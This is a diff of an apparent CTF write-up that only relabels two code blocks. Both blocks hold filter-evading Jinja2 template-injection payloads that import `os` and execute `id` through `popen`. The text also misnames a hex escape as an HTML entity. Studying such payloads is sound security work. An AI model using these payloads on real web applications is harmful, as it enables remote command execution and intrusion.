@@ -45,7 +45,7 @@ The writeup with the payload I used also includes some payloads if `.` `_` `[` a
 
 It uses `attr()` to bypass `.` `[` and `]` and uses the HTML entity `\x5f` instead of `_` .
 
-```bash
+```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
@@ -53,7 +53,7 @@ It uses `attr()` to bypass `.` `[` and `]` and uses the HTML entity `\x5f` inste
 
 Since some terms are still forbidden I try encoding the forbidden terms as HTML entities as well.
 
-```bash
+```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}
 ```
 
